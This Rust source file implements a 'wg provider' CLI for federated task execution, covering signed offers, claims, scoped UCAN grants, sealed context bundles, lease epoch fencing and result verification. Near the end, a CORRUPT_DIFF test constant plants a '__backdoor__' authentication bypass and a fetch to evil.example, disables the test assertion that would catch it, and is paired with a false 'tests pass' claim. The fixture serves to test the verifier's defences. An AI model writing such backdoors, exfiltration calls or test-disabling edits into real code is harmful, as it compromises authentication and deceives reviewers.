//! `wg provider` — the WG-Exec execution-federation surface (Exec-Wave B spark).
//!
//! The thin CLI glue over `worksgood::providers` (the library carries the crypto + the
//! invariants; this module is on-disk wiring + JSON). It reuses the WG-Fed identity
//! plane verbatim (`wg identity` mints/publishes; this module loads those identities and
//! resolves sigchains over the same `--store`) — **no second identity or crypto system
//! (NFR-4)**. The authorizer's canonical state (the [`ProviderRegistry`] and the
//! [`LeaseLedger`]) lives under `<wgdir>/exec/`; the canonical graph stays at the
//! authorizer (the single write boundary the epoch fence guards).
//!
//! The six-step flow (mirrors `docs/.../06` §4.2): `enroll` → `offer` → `claim` →
//! `grant` → `run` → `accept`, with `reclaim` / `verify` exercising the leash bounds and
//! `show` / `providers` surfacing the applied leash (ADR-E3 Consequences).

use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use chrono::Utc;
use serde_json::json;

use worksgood::identity::custody::{self, Ability, LeashPolicy, Scope};
use worksgood::identity::keys::Custodian;
use worksgood::identity::transport::open_store;
use worksgood::providers::bundle::{ContextSlice, DepArtifact, SealedBundle, recipient_enc_key};
use worksgood::providers::lease::{Lease, LeaseLedger};
use worksgood::providers::placement::{
    PlacementVerdict, TaskRequirements, evaluate_placement, leash,
};
use worksgood::providers::verify::{
    Checkability, PinnedSpec, VerifyRequest, authorize_graph_write, verify_attribution,
    verify_result,
};
use worksgood::providers::{
    CapabilityAd, Claim, IsolationClass, PlacementOffer, PoolClass, ProviderRegistry,
    ResultEnvelope, Sensitivity, TrustLevel, Usage, WG_EXEC_COMPAT_VERSION, check_exec_compat,
    parse_trust, trust_str,
};

use super::identity_cmd::{load_local, resolve_auth_cached, signing_kid};

// ── On-disk authorizer state (under <wgdir>/exec/) ──────────────────────────────

fn exec_dir(workgraph_dir: &Path) -> PathBuf {
    workgraph_dir.join("exec")
}

fn registry_path(workgraph_dir: &Path) -> PathBuf {
    exec_dir(workgraph_dir).join("registry.json")
}

fn ledger_path(workgraph_dir: &Path) -> PathBuf {
    exec_dir(workgraph_dir).join("leases.json")
}

fn load_registry(workgraph_dir: &Path) -> ProviderRegistry {
    std::fs::read_to_string(registry_path(workgraph_dir))
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn save_registry(workgraph_dir: &Path, reg: &ProviderRegistry) -> Result<()> {
    let dir = exec_dir(workgraph_dir);
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    std::fs::write(
        registry_path(workgraph_dir),
        serde_json::to_string_pretty(reg)?,
    )?;
    Ok(())
}

fn load_ledger(workgraph_dir: &Path) -> LeaseLedger {
    std::fs::read_to_string(ledger_path(workgraph_dir))
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn save_ledger(workgraph_dir: &Path, led: &LeaseLedger) -> Result<()> {
    let dir = exec_dir(workgraph_dir);
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    std::fs::write(
        ledger_path(workgraph_dir),
        serde_json::to_string_pretty(led)?,
    )?;
    Ok(())
}

fn emit(json: bool, value: serde_json::Value, human: &str) {
    if json {
        println!("{}", serde_json::to_string(&value).unwrap_or_default());
    } else {
        println!("{human}");
    }
}

/// Trust → pool class (ADR-E1 D4: one mechanism, three operating points).
fn pool_for(trust: TrustLevel) -> PoolClass {
    match trust {
        TrustLevel::Verified => PoolClass::Private,
        TrustLevel::Provisional => PoolClass::Cooperative,
        TrustLevel::Unknown => PoolClass::Cooperative,
    }
}

fn now_or(override_ts: Option<&str>) -> Result<chrono::DateTime<chrono::Utc>> {
    match override_ts {
        Some(s) => chrono::DateTime::parse_from_rfc3339(s)
            .map(|t| t.with_timezone(&chrono::Utc))
            .map_err(|e| anyhow::anyhow!("--now {s:?} is not RFC3339: {e}")),
        None => Ok(Utc::now()),
    }
}

// ── enroll ───────────────────────────────────────────────────────────────────

/// `wg provider enroll` — record a provider in the authorizer's pool at an
/// authorizer-asserted trust level + advertised capability (ADR-E1 D6). Trust is the
/// authorizer's to set; the provider never self-certifies it.
#[allow(clippy::too_many_arguments)]
pub fn run_enroll(
    workgraph_dir: &Path,
    provider_wgid: &str,
    trust: &str,
    model: &str,
    isolation: &str,
    attested: bool,
    json: bool,
) -> Result<()> {
    let trust = parse_trust(trust)?;
    let isolation = IsolationClass::parse(isolation)?;
    let mut reg = load_registry(workgraph_dir);
    reg.enroll(
        provider_wgid,
        trust,
        Some(CapabilityAd {
            model: model.to_string(),
            isolation,
            attested,
        }),
    );
    save_registry(workgraph_dir, &reg)?;
    emit(
        json,
        json!({
            "enrolled": provider_wgid,
            "trust": trust_str(trust),
            "model": model,
            "isolation": isolation.as_str(),
            "attested": attested,
        }),
        &format!(
            "enrolled {provider_wgid} at trust={} ({}, attested={attested})",
            trust_str(trust),
            isolation.as_str()
        ),
    );
    Ok(())
}

// ── offer (the fail-closed placement gate; ADR-E1 + ADR-E2 D2) ──────────────────

/// `wg provider offer` — the authorizer emits a `PlacementOffer` after the **fail-closed
/// filter+leash**. A confidential task to a non-attested provider, or an unlabeled task,
/// is **refused here** — no offer is written, so context is NEVER shipped (ADR-E2 D2/D-i,
/// the spark step-6 assertion).
#[allow(clippy::too_many_arguments)]
pub fn run_offer(
    workgraph_dir: &Path,
    as_name: &str,
    task: &str,
    model: &str,
    isolation: &str,
    sensitivity: Option<&str>,
    provider_wgid: &str,
    out: &str,
    json: bool,
) -> Result<()> {
    let g = load_local(workgraph_dir, as_name)?;
    let g_auth = g.auth()?;
    let cust = Custodian::new(g.name());
    let signer = signing_kid(&g, &cust, &g_auth)?;

    let sens = match sensitivity {
        Some(s) => Sensitivity::parse(s),
        None => Sensitivity::Unlabeled,
    };
    let min_iso = IsolationClass::parse(isolation)?;
    let reg = load_registry(workgraph_dir);
    let provider_trust = reg.trust_of(provider_wgid);
    let provider_cap = reg.get(provider_wgid).and_then(|e| e.capability.clone());

    let req = TaskRequirements {
        task_id: task.to_string(),
        required_model: model.to_string(),
        min_isolation: min_iso,
        sensitivity: sens,
    };

    match evaluate_placement(
        &req,
        provider_trust,
        provider_cap.as_ref(),
        pool_for(provider_trust),
    ) {
        PlacementVerdict::Refused(r) => {
            // Fail-closed: no offer is emitted; context is never shipped to the provider.
            emit(
                json,
                json!({
                    "placed": false,
                    "refused": true,
                    "reason": r.reason,
                    "detail": r.detail,
                    "context_shipped": false,
                    "task": task,
                    "provider": provider_wgid,
                }),
                &format!("REFUSED ({}): {} — context NOT shipped", r.reason, r.detail),
            );
            Ok(())
        }
        PlacementVerdict::Eligible(decision) => {
            // Reserve the lease epoch for this placement (epoch starts at 1).
            let mut led = load_ledger(workgraph_dir);
            let epoch = led.place(task, provider_wgid);
            save_ledger(workgraph_dir, &led)?;

            let mut offer = PlacementOffer::build(
                task,
                g.wgid(),
                provider_wgid,
                model,
                min_iso,
                sens,
                decision.trust_floor,
                epoch,
                &Utc::now().to_rfc3339(),
            );
            offer.sign(&cust, &signer)?;
            std::fs::write(out, serde_json::to_string_pretty(&offer)?)
                .with_context(|| format!("writing offer to {out}"))?;

            emit(
                json,
                json!({
                    "placed": true,
                    "refused": false,
                    "task": task,
                    "provider": provider_wgid,
                    "trust_floor": trust_str(decision.trust_floor),
                    "lease_epoch": epoch,
                    "context_seal": decision.context_seal.as_str(),
                    "verification_depth": decision.verification_depth.as_str(),
                    "exec_compat": WG_EXEC_COMPAT_VERSION,
                    "offer_file": out,
                }),
                &format!(
                    "offered {task} to {provider_wgid} (epoch {epoch}, seal={}, verify={})",
                    decision.context_seal.as_str(),
                    decision.verification_depth.as_str()
                ),
            );
            Ok(())
        }
    }
}

// ── claim (provider → authorizer; a request, not an authorization) ──────────────

/// `wg provider claim` — a provider builds a signed `Claim` against an offer (ADR-E1 D2,
/// the OQ3 eligibility proof). It advertises capability + signs (identity proof); it does
/// **not** assert its own trust. The authorizer's `RunGrant`, not this, authorizes.
pub fn run_claim(
    workgraph_dir: &Path,
    as_name: &str,
    offer_file: &str,
    store_loc: &str,
    out: &str,
    json: bool,
) -> Result<()> {
    let p = load_local(workgraph_dir, as_name)?;
    let p_auth = p.auth()?;
    let cust = Custodian::new(p.name());
    let signer = signing_kid(&p, &cust, &p_auth)?;

    let offer: PlacementOffer = read_json(offer_file)?;
    check_exec_compat(&offer.exec_compat)?;
    // Authenticate the offer: it must be signed by the authorizer it names.
    let store = open_store(store_loc)?;
    let auth_auth = resolve_auth_cached(workgraph_dir, store.as_ref(), &offer.authorizer)
        .with_context(|| format!("resolving offer authorizer {}", offer.authorizer))?;
    offer
        .verify_sig(&auth_auth)
        .context("offer signature does not verify against the named authorizer")?;
    if offer.provider != p.wgid() {
        bail!(
            "offer is addressed to {} but this provider is {}",
            offer.provider,
            p.wgid()
        );
    }

    let cap = CapabilityAd {
        model: offer.required_model.clone(),
        isolation: offer.min_isolation,
        attested: false, // v1 attestation slot is empty — a spark provider is never attested.
    };
    let mut claim = Claim::build(&offer.task_id, p.wgid(), cap, &Utc::now().to_rfc3339());
    claim.sign(&cust, &signer)?;
    std::fs::write(out, serde_json::to_string_pretty(&claim)?)
        .with_context(|| format!("writing claim to {out}"))?;

    emit(
        json,
        json!({
            "claimed": true,
            "task": offer.task_id,
            "provider": p.wgid(),
            "model": offer.required_model,
            "isolation": offer.min_isolation.as_str(),
            "claim_file": out,
        }),
        &format!("claimed {} as {}", offer.task_id, p.wgid()),
    );
    Ok(())
}

// ── grant (the placement decision: two scoped UCANs + sealed bundle + lease) ─────

/// `wg provider grant` — the authorizer verifies the claim, runs the leash, issues the
/// **two scoped attenuating UCANs** (act-as-agent + graph-write-task-only — never the
/// root key, never blanket graph write), seals the minimal `ContextScope` slice to the
/// provider, and emits a signed `RunGrant`. The field-scan (no root key / no blanket
/// write) is the step-1 assertion (ADR-E3 D1).
#[allow(clippy::too_many_arguments)]
pub fn run_grant(
    workgraph_dir: &Path,
    as_name: &str,
    claim_file: &str,
    task_input_file: &str,
    after: &[String],
    ucan_ttl_secs: Option<i64>,
    store_loc: &str,
    out: &str,
    json: bool,
) -> Result<()> {
    let g = load_local(workgraph_dir, as_name)?;
    let g_auth = g.auth()?;
    let cust = Custodian::new(g.name());
    let signer = signing_kid(&g, &cust, &g_auth)?;
    let now = Utc::now();

    let claim: Claim = read_json(claim_file)?;
    check_exec_compat(&claim.exec_compat)?;
    let store = open_store(store_loc)?;

    // Authenticate the claim (identity proof) against the provider's sigchain.
    let provider_auth = resolve_auth_cached(workgraph_dir, store.as_ref(), &claim.provider)
        .with_context(|| format!("resolving claimant {}", claim.provider))?;
    claim
        .verify_sig(&provider_auth)
        .context("claim signature does not verify against the claimant's sigchain")?;

    // Re-run the fail-closed filter+leash with the authorizer's OWN trust record.
    let reg = load_registry(workgraph_dir);
    let provider_trust = reg.trust_of(&claim.provider);
    let provider_cap = reg.get(&claim.provider).and_then(|e| e.capability.clone());
    let req = TaskRequirements {
        task_id: claim.task_id.clone(),
        required_model: claim.capability.model.clone(),
        min_isolation: claim.capability.isolation,
        sensitivity: Sensitivity::Normal, // a granted task cleared the offer's sensitivity gate.
    };
    let decision = match evaluate_placement(
        &req,
        provider_trust,
        provider_cap.as_ref(),
        pool_for(provider_trust),
    ) {
        PlacementVerdict::Eligible(d) => d,
        PlacementVerdict::Refused(r) => {
            bail!(
                "refusing to grant — placement filter says {}: {}",
                r.reason,
                r.detail
            )
        }
    };

    let ttl = ucan_ttl_secs.unwrap_or(decision.delegation_ttl_secs);
    let task = &claim.task_id;

    // The two scoped attenuating UCANs (ADR-E3 D1), issued via WG-Fed's UCAN — no new
    // delegation system. act-as-agent is intent-bound to THIS task; graph-write is the
    // single task subtree only (never graph://*).
    let policy = LeashPolicy::from_env();
    let act_scope = Scope::new(vec![Ability::new(
        "act-as-agent",
        &format!("agent://{}/task/{task}", g.wgid()),
    )]);
    let write_scope = Scope::new(vec![Ability::new(
        "graph/write",
        &format!("graph://task/{task}"),
    )]);
    let act_as_agent_ucan = custody::issue_root(
        &cust,
        &signer,
        g.wgid(),
        &claim.provider,
        act_scope,
        Some(ttl),
        now,
        &policy,
        false,
    )?;
    let graph_write_ucan = custody::issue_root(
        &cust,
        &signer,
        g.wgid(),
        &claim.provider,
        write_scope,
        Some(ttl),
        now,
        &policy,
        false,
    )?;

    // Build + seal the minimal context slice to the provider's enrollment enc key.
    let task_input = std::fs::read_to_string(task_input_file)
        .with_context(|| format!("reading task input {task_input_file}"))?;
    let mut after_artifacts = Vec::new();
    for spec in after {
        let (dep, file) = spec
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("--after expects dep_task=path, got {spec:?}"))?;
        let artifact = std::fs::read_to_string(file)
            .with_context(|| format!("reading --after artifact {file}"))?;
        after_artifacts.push(DepArtifact {
            task_id: dep.to_string(),
            artifact,
        });
    }
    let slice = ContextSlice::build(
        task,
        decision.context_scope_tier,
        &task_input,
        after_artifacts,
    );
    let (enc_kid, enc_pub) = recipient_enc_key(&provider_auth)?;
    let bundle = SealedBundle::seal(
        &slice,
        g.wgid(),
        &claim.provider,
        &cust,
        &signer,
        &[(enc_kid, enc_pub)],
        &now.to_rfc3339(),
    )?;

    // The lease (epoch reserved at offer time; reuse it).
    let mut led = load_ledger(workgraph_dir);
    let epoch = led
        .current_epoch(task)
        .unwrap_or_else(|| led.place(task, &claim.provider));
    save_ledger(workgraph_dir, &led)?;
    let mut lease = Lease::build(
        task,
        g.wgid(),
        &claim.provider,
        epoch,
        decision.lease_term_secs,
        decision.lease_renew_cadence_secs,
        &now.to_rfc3339(),
    );
    lease.sign(&cust, &signer)?;

    let mut grant = worksgood::providers::RunGrant {
        v: worksgood::identity::ENVELOPE_V,
        alg: worksgood::identity::ALG_ED25519.to_string(),
        exec_compat: WG_EXEC_COMPAT_VERSION.to_string(),
        task_id: task.clone(),
        authorizer: g.wgid().to_string(),
        provider: claim.provider.clone(),
        act_as_agent_ucan,
        graph_write_ucan,
        bundle,
        lease,
        created_at: now.to_rfc3339(),
        sig: String::new(),
    };
    grant.sign(&cust, &signer)?;
    std::fs::write(out, serde_json::to_string_pretty(&grant)?)
        .with_context(|| format!("writing grant to {out}"))?;

    let scan = grant.field_scan();
    emit(
        json,
        json!({
            "granted": true,
            "task": task,
            "provider": claim.provider,
            "exec_compat": WG_EXEC_COMPAT_VERSION,
            "signed": true,
            "ucan_ttl_secs": ttl,
            "lease_epoch": epoch,
            "field_scan": {
                "contains_private_key_material": scan.contains_private_key_material,
                "has_blanket_graph_write": scan.has_blanket_graph_write,
                "graph_write_resource": scan.graph_write_resource,
                "act_as_agent_resource": scan.act_as_agent_resource,
            },
            "grant_file": out,
        }),
        &format!(
            "granted {task} to {} — two scoped UCANs (write={}), no root key={}",
            claim.provider, scan.graph_write_resource, !scan.contains_private_key_material
        ),
    );
    Ok(())
}

// ── run (the worker on the provider: open slice, produce a signed result) ────────

/// `wg provider run` — the worker on the provider verifies the grant + both UCANs
/// offline, opens its sealed slice (asserting it is exactly the configured tier with no
/// out-of-slice secret), and emits a `ResultEnvelope` signed by its delegated signer.
/// `--corrupt` produces the hostile diff (claims tests pass, plants a backdoor, edits a
/// test) for the step-5 integrity assertion. `--target-task` aims the write at a
/// different task for the step-4(i) over-scope assertion.
#[allow(clippy::too_many_arguments)]
pub fn run_worker_run(
    workgraph_dir: &Path,
    as_name: &str,
    grant_file: &str,
    store_loc: &str,
    out: &str,
    target_task: Option<&str>,
    corrupt: bool,
    scope_probe: Option<&str>,
    json: bool,
) -> Result<()> {
    let p = load_local(workgraph_dir, as_name)?;
    let p_auth = p.auth()?;
    let cust = Custodian::new(p.name());
    let signer = signing_kid(&p, &cust, &p_auth)?;
    let now = Utc::now();

    let grant: worksgood::providers::RunGrant = read_json(grant_file)?;
    check_exec_compat(&grant.exec_compat)?;
    let store = open_store(store_loc)?;
    let resolve = |w: &str| resolve_auth_cached(workgraph_dir, store.as_ref(), w);

    // Authenticate the grant (signed by the authorizer it names).
    let authorizer_auth = resolve(&grant.authorizer)
        .with_context(|| format!("resolving grant authorizer {}", grant.authorizer))?;
    grant
        .verify_sig(&authorizer_auth)
        .context("grant signature does not verify against the authorizer")?;

    // Verify the two UCANs offline (chain to G, not expired/revoked).
    custody::verify(&grant.act_as_agent_ucan, now, &[], &resolve)
        .context("act-as-agent UCAN does not verify")?;
    custody::verify(&grant.graph_write_ucan, now, &[], &resolve)
        .context("graph-write UCAN does not verify")?;

    // Open the sealed slice; only this provider's enc key can (encryption = ACL).
    grant
        .bundle
        .verify_sealer(&authorizer_auth)
        .context("bundle sealer signature does not verify")?;
    let slice = grant
        .bundle
        .open(&cust)
        .context("opening sealed context bundle")?;

    let out_of_slice_secret_found = scope_probe
        .map(|s| slice.contains(s) || grant.bundle.wire_leaks(s))
        .unwrap_or(false);
    // No standing credential beyond the two scoped UCANs may ride in the slice.
    let credential_beyond_ucans_found = {
        let s = serde_json::to_string(&slice).unwrap_or_default();
        s.contains("ed25519:") || s.contains("x25519:")
    };

    let work_product = if corrupt {
        // The plausible-but-corrupted diff: claims tests pass, plants a backdoor, AND
        // edits the test file to disable the assertion that would catch it (X-6).
        CORRUPT_DIFF.to_string()
    } else {
        LEGIT_DIFF.to_string()
    };
    let target = target_task.unwrap_or(&grant.task_id).to_string();

    let mut result = ResultEnvelope {
        v: worksgood::identity::ENVELOPE_V,
        alg: worksgood::identity::ALG_ED25519.to_string(),
        exec_compat: WG_EXEC_COMPAT_VERSION.to_string(),
        task_id: target.clone(),
        agent: grant.authorizer.clone(),
        producer: p.wgid().to_string(),
        epoch: grant.lease.epoch,
        work_product,
        claims_tests_pass: true,
        usage: Usage {
            input_tokens: 1200,
            output_tokens: 340,
            cost_usd: 0.012,
        },
        act_as_agent_ucan: grant.act_as_agent_ucan.clone(),
        graph_write_ucan: grant.graph_write_ucan.clone(),
        created_at: now.to_rfc3339(),
        sig: String::new(),
    };
    result.sign(&cust, &signer)?;
    std::fs::write(out, serde_json::to_string_pretty(&result)?)
        .with_context(|| format!("writing result to {out}"))?;

    emit(
        json,
        json!({
            "ran": true,
            "slice_scope_tier": slice.scope_tier,
            "slice_task_id": slice.task_id,
            "out_of_slice_secret_found": out_of_slice_secret_found,
            "credential_beyond_ucans_found": credential_beyond_ucans_found,
            "attribution_signer": p.wgid(),
            "target_task": target,
            "corrupted": corrupt,
            "result_file": out,
        }),
        &format!(
            "ran {} (slice tier={}, out-of-slice-secret={}); result signed by {}",
            target,
            slice.scope_tier,
            out_of_slice_secret_found,
            p.wgid()
        ),
    );
    Ok(())
}

// ── accept (the canonical write boundary: attribution + scope + epoch fence) ─────

/// `wg provider accept` — the authorizer's canonical-write accept path: verify
/// attribution (rejecting unsigned / wrong-signed / **expired**), authorize the write
/// under the task-scoped graph-write UCAN (rejecting a write to a **different task**),
/// then the **atomic epoch CAS** (rejecting a **stale** or **replayed** write). `--now`
/// overrides the clock for the post-expiry assertion.
pub fn run_accept(
    workgraph_dir: &Path,
    result_file: &str,
    store_loc: &str,
    now_override: Option<&str>,
    json: bool,
) -> Result<()> {
    let result: ResultEnvelope = read_json(result_file)?;
    check_exec_compat(&result.exec_compat)?;
    let now = now_or(now_override)?;
    let store = open_store(store_loc)?;
    let resolve = |w: &str| resolve_auth_cached(workgraph_dir, store.as_ref(), w);

    // 1. Attribution — unsigned / wrong-signed / expired ⇒ rejected (ADR-E4 D1).
    let attr = verify_attribution(&result, now, &[], &resolve);
    if !attr.ok {
        return reject(json, "attribution-failed", &attr.reason);
    }

    // 2. The write must be authorized by the task-scoped graph-write UCAN (FR-C2/V4).
    if let Err(e) = authorize_graph_write(
        &result.graph_write_ucan,
        &result.agent,
        &result.producer,
        &result.task_id,
        now,
        &[],
        &resolve,
    ) {
        return reject(json, "graph-write-scope-violation", &e.to_string());
    }

    // 3. The atomic epoch CAS at the single canonical-write boundary (ADR-E3 D6).
    let mut led = load_ledger(workgraph_dir);
    if let Err(fence) = led.try_commit(&result.task_id, result.epoch) {
        return reject(json, fence_code(&fence), &fence.to_string());
    }
    save_ledger(workgraph_dir, &led)?;

    // Record the provider's liveness (an accepted write implies an accepted renewal).
    let mut reg = load_registry(workgraph_dir);
    reg.record_renewal(&result.producer, result.epoch, &now.to_rfc3339());
    save_registry(workgraph_dir, &reg)?;

    emit(
        json,
        json!({
            "accepted": true,
            "attributed_to": result.agent,
            "producer": result.producer,
            "task": result.task_id,
            "epoch": result.epoch,
            "usage": {
                "input_tokens": result.usage.input_tokens,
                "output_tokens": result.usage.output_tokens,
                "cost_usd": result.usage.cost_usd,
            },
            "reason": "accepted",
        }),
        &format!(
            "accepted result for {} — attributed to {} (produced by {})",
            result.task_id, result.agent, result.producer
        ),
    );
    Ok(())
}

fn reject(json: bool, reason: &str, detail: &str) -> Result<()> {
    emit(
        json,
        json!({ "accepted": false, "reason": reason, "detail": detail }),
        &format!("REJECTED ({reason}): {detail}"),
    );
    Ok(())
}

fn fence_code(f: &worksgood::providers::lease::FenceError) -> &'static str {
    use worksgood::providers::lease::FenceError::*;
    match f {
        StaleEpoch { .. } => "stale-epoch",
        AlreadyCommitted { .. } => "replay-already-committed",
        NoPlacement => "no-placement",
    }
}

// ── reclaim (bump the fencing epoch; ADR-E3 D6) ─────────────────────────────────

/// `wg provider reclaim` — reclaim a task, bumping the monotonic lease epoch. The old
/// worker's epoch is now stale; any late write/renewal it produces is fenced out.
pub fn run_reclaim(
    workgraph_dir: &Path,
    task: &str,
    new_provider: Option<&str>,
    json: bool,
) -> Result<()> {
    let mut led = load_ledger(workgraph_dir);
    let new_epoch = led
        .reclaim(task, new_provider.unwrap_or("wgid:reassigned"))
        .with_context(|| format!("reclaiming {task}"))?;
    save_ledger(workgraph_dir, &led)?;
    emit(
        json,
        json!({ "reclaimed": true, "task": task, "new_epoch": new_epoch }),
        &format!("reclaimed {task} → epoch {new_epoch} (old epoch now stale)"),
    );
    Ok(())
}

// ── verify (the integrity leash: disjoint re-run vs a pinned spec; ADR-E4 D3) ────

/// `wg provider verify` — apply the low-trust integrity leash: attribution + a
/// **deterministic re-run in a trusted domain (never the producer) vs the authorizer's
/// pinned spec** (not the provider's shipped tests). Catches a corrupted result, flags a
/// test-poisoning attempt, and records provenance. `--verifier` MUST differ from the
/// producer (X-5) — the engine refuses otherwise.
#[allow(clippy::too_many_arguments)]
pub fn run_verify(
    workgraph_dir: &Path,
    result_file: &str,
    verifier_wgid: &str,
    pinned_spec_file: &str,
    checkability: &str,
    store_loc: &str,
    json: bool,
) -> Result<()> {
    let result: ResultEnvelope = read_json(result_file)?;
    check_exec_compat(&result.exec_compat)?;
    let spec: PinnedSpec = read_json(pinned_spec_file)?;
    let store = open_store(store_loc)?;
    let resolve = |w: &str| resolve_auth_cached(workgraph_dir, store.as_ref(), w);
    let now = Utc::now();

    let check = match checkability.trim().to_ascii_lowercase().as_str() {
        "checkable" => Checkability::Checkable,
        "semi" | "semi-checkable" => Checkability::SemiCheckable,
        "non" | "non-checkable" => Checkability::NonCheckable,
        other => bail!("unknown checkability {other:?} (checkable|semi|non)"),
    };
    let reg = load_registry(workgraph_dir);
    let trust = reg.trust_of(&result.producer);

    let req = VerifyRequest {
        result: &result,
        producer: result.producer.clone(),
        verifier: verifier_wgid.to_string(),
        trust,
        checkability: check,
        pinned_spec: &spec,
    };

    match verify_result(&req, now, &[], &resolve) {
        Ok(verdict) => {
            // If a result is rejected as a forgery, lower the producer's trust so its next
            // item takes the deeper path, and surface the descendants to re-run (D4/D6).
            if !verdict.accepted {
                let mut reg = reg;
                reg.lower_trust(&result.producer);
                save_registry(workgraph_dir, &reg)?;
            }
            emit(
                json,
                json!({
                    "accepted": verdict.accepted,
                    "attribution_ok": verdict.attribution_ok,
                    "reran": verdict.reran,
                    "reran_on": verdict.reran_on,
                    "reran_on_is_producer": verdict.reran_on_is_producer,
                    "test_poisoning_flagged": verdict.test_poisoning_flagged,
                    "provenance_producer": verdict.provenance_producer,
                    "reason": verdict.reason,
                }),
                &format!(
                    "verify {} (reran on {}, test-poison={}): {}",
                    if verdict.accepted {
                        "ACCEPTED"
                    } else {
                        "REJECTED"
                    },
                    verdict.reran_on,
                    verdict.test_poisoning_flagged,
                    verdict.reason
                ),
            );
            Ok(())
        }
        Err(e) => {
            // The X-5 guard (verifier == producer) fires here.
            emit(
                json,
                json!({
                    "accepted": false,
                    "refused": true,
                    "reason": "verifier-is-producer",
                    "detail": e.to_string(),
                }),
                &format!("REFUSED: {e}"),
            );
            Ok(())
        }
    }
}

// ── show / providers (surface the applied leash; ADR-E3 Consequences) ───────────

/// `wg provider show` — surface the applied lease + (recomputed) leash for a task, so a
/// mis-set dial is visible at a glance (`wg show` parity).
pub fn run_show(
    workgraph_dir: &Path,
    task: &str,
    sensitivity: Option<&str>,
    json: bool,
) -> Result<()> {
    let led = load_ledger(workgraph_dir);
    let st = led
        .tasks
        .get(task)
        .ok_or_else(|| anyhow::anyhow!("no lease placement on record for {task}"))?;
    let reg = load_registry(workgraph_dir);
    let trust = reg.trust_of(&st.provider);
    let attested = reg
        .get(&st.provider)
        .and_then(|e| e.capability.as_ref())
        .map(|c| c.attested)
        .unwrap_or(false);
    let sens = sensitivity
        .map(Sensitivity::parse)
        .unwrap_or(Sensitivity::Normal);
    let leash_v = match leash(trust, sens, pool_for(trust), attested) {
        Ok(d) => json!({
            "trust_floor": trust_str(d.trust_floor),
            "delegation_broad": d.delegation_broad,
            "delegation_ttl_secs": d.delegation_ttl_secs,
            "context_scope_tier": d.context_scope_tier.to_string(),
            "context_seal": d.context_seal.as_str(),
            "verification_depth": d.verification_depth.as_str(),
            "lease_term_secs": d.lease_term_secs,
            "lease_renew_cadence_secs": d.lease_renew_cadence_secs,
        }),
        Err(r) => json!({ "refused": r.reason, "detail": r.detail }),
    };
    emit(
        json,
        json!({
            "task": task,
            "provider": st.provider,
            "trust": trust_str(trust),
            "epoch": st.epoch,
            "committed": st.committed,
            "last_renewal_epoch": st.last_renewal_epoch,
            "leash": leash_v,
        }),
        &format!(
            "task {task}: provider {} trust={} epoch={} committed={}",
            st.provider,
            trust_str(trust),
            st.epoch,
            st.committed
        ),
    );
    Ok(())
}

/// `wg provider providers` (alias `list`) — the authorizer's known pool with trust +
/// observed liveness (ADR-E1 D6 / ADR-E3 D5).
pub fn run_providers(workgraph_dir: &Path, json: bool) -> Result<()> {
    let reg = load_registry(workgraph_dir);
    let led = load_ledger(workgraph_dir);
    let mut rows = Vec::new();
    for (wgid, e) in &reg.providers {
        // A provider is "live" if it has an accepted renewal at/after any task's current
        // epoch it holds; for display we report its highest renewal epoch.
        let live = led
            .tasks
            .values()
            .filter(|s| &s.provider == wgid)
            .any(|s| e.is_live(s.epoch));
        rows.push(json!({
            "wgid": wgid,
            "trust": trust_str(e.trust_level),
            "capability": e.capability.as_ref().map(|c| json!({
                "model": c.model, "isolation": c.isolation.as_str(), "attested": c.attested,
            })),
            "last_renewal_epoch": e.last_renewal_epoch,
            "live": live,
        }));
    }
    emit(
        json,
        serde_json::Value::Array(rows.clone()),
        &format!("{} provider(s) enrolled", rows.len()),
    );
    Ok(())
}

// ── shared ──────────────────────────────────────────────────────────────────

fn read_json<T: serde::de::DeserializeOwned>(path: &str) -> Result<T> {
    let s = std::fs::read_to_string(path).with_context(|| format!("reading {path}"))?;
    serde_json::from_str(&s).with_context(|| format!("parsing {path}"))
}

// ── The deterministic spark deliverables (a legit and a corrupted diff) ─────────

/// The legit work product — satisfies the authorizer's pinned spec (contains the real
/// `verify(tok)` check, no backdoor/exfil marker).
const LEGIT_DIFF: &str = "\
--- a/src/auth.rs
+++ b/src/auth.rs
@@
-fn check(tok: &str) -> bool { todo!() }
+fn check(tok: &str) -> bool { verify(tok) }
";

/// The hostile work product (step 5): claims tests pass, but plants a `__backdoor__`
/// short-circuit + a `fetch(\"http://evil\")` exfil, AND edits the test file to disable
/// the assertion that would catch it (X-6, the test-poisoning attempt).
const CORRUPT_DIFF: &str = "\
--- a/src/auth.rs
+++ b/src/auth.rs
@@
-fn check(tok: &str) -> bool { verify(tok) }
+fn check(tok: &str) -> bool {
+    if tok == \"__backdoor__\" { return true; }
+    let _ = fetch(\"http://evil.example/exfil\");
+    verify(tok)
+}
--- a/tests/auth_test.rs
+++ b/tests/auth_test.rs
@@
-assert!(!check(\"__backdoor__\"));
+// assertion disabled
";
